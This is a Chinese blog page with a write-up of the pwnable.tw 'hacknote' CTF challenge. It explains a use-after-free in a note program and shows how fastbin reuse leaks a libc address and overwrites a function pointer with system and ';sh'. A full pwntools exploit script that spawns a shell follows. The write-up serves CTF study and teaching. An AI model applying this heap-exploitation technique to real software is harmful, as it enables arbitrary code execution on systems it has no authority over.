                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/03/08/pwnable-tw-hacknote/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/03/08/pwnable-tw-hacknote/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/03/08/pwnable-tw-hacknote/" class="leancloud_visitors" data-flag-title="pwnable.tw--hacknote">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  859字
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h1><h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p>这又是一道malloc相关的内存题目，但是不是老套路。三个函数：add_note，delete_note和print_note。</p>
<p>使用add_note分配的地址用一个堆表（自己起的名字）存放，（其实就是一个存放地址的数组）。通过add_note可以看出分配的每个块是什么结构：</p>
<p><img src="/2018/03/08/pwnable-tw-hacknote/addnote.png" alt="add_note"></p>
<p>首先在ptr[i]中存放一个8字节大小的block（实际malloc分配了16字节）地址；然后这个地址中（称为note块）前4个字节是一个函数地址，即输出地址+4中的内容：</p>
<p><img src="/2018/03/08/pwnable-tw-hacknote/puts.png" alt="函数内容"></p>
<p>另外四个字节存放一个新分配的content块的地址，大小size由用户进行输入。对于一个初始状态的地址空间，add_note后的结构如下：</p>
<hr>
<p><img src="/2018/03/08/pwnable-tw-hacknote/note结构.png" alt="note结构，content结构"></p>
<hr>
<p>delete_note就是先释放content地址这块空间，再释放malloc（8）这块空间。</p>
<p>print_note就是调用note块的第一个字段即puts函数</p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>deltenote将note和content释放之后并没有将ptr[i]置为空，也就是说，虽然指针所指向的内存释放掉了，但实际内容还在，我们仍然能使用，即UAF。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>本题的关键点是，当某一次申请的content大小也为8时，将有机会分配到之前释放过的note块。这样通过向content中写入内容相当于修改note块。由此达到目的。 </p>
<p><strong>system函数地址泄露</strong>：print_note的打印功能可以帮助泄露地址。例如，先add note0，大小为128，再add note1，大小为128。delete note1，note0.此时再申请add note2，大小为8. 那么note2的note块就是note0块，note2的content块就是note1块（fastbin的原则是LIFO）。此时向content2中写入puts函数地址（保持不变，还是原来的）和free@got地址，这样在调用 print note2时，就会将free函数的实际地址泄露，再根据偏移泄露system函数地址。</p>
<p><strong>system函数调用</strong>：同理，这个操作与地址泄露相似，delete note2，add note3，也是要求content大小为8，这次将puts函数地址位置覆写成泄露的system函数地址和将要执行的指令。 </p>
<p>这里涉及一个知识点：Linux连续执行多条命令<a href="http://blog.csdn.net/freedom2028/article/details/7104131" target="_blank" rel="noopener">http://blog.csdn.net/freedom2028/article/details/7104131</a> 仔细看print_note，最终调用函数时，参数也是同一个地址：</p>
<p><img src="/2018/03/08/pwnable-tw-hacknote/printnote.png" alt="print_note"></p>
<p> 即，如果将puts函数地址覆盖为system地址，system的参数是system函数地址本身，这样肯定不行。但是使用连续执行多条命令的’ ; ‘，第一条执行错误会被忽略，然后执行下一条，因此可以将content位置覆盖成 ‘;sh\0’.</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Note size :'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Content :'</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span> </span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./hacknote'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10102</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line">add_note(<span class="number">128</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add_note(<span class="number">128</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804862b</span>)+p32(<span class="number">0x804A018</span>)</span><br><span class="line">add_note(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">print_note(<span class="number">1</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"free_addr:%x"</span> %free_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = libc.symbols[<span class="string">'system'</span>] - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">system_addr = free_addr + offset</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line">payload = p32(system_addr) + <span class="string">';sh\0'</span></span><br><span class="line">add_note(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">print_note(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"offset:%x,system_addr: %x"</span> %(offset,system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">0gur1</p>
              <p class="site-description motion-element" itemprop="description">Stay hungry.Stay foolish.</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">11</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">0gur1</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>



<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客量:<span id="busuanzi_value_site_uv"></span>
</span>
</div>
        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'KvkboNezCqOpWaIBvOMgJE3K-gzGzoHsz',
        appKey: 'slQuYxW7tjbda9dyxmi3dY4o',
        placeholder: 'Just go go',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("KvkboNezCqOpWaIBvOMgJE3K-gzGzoHsz", "slQuYxW7tjbda9dyxmi3dY4o");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  
  

  

  

  

</body>
</html>
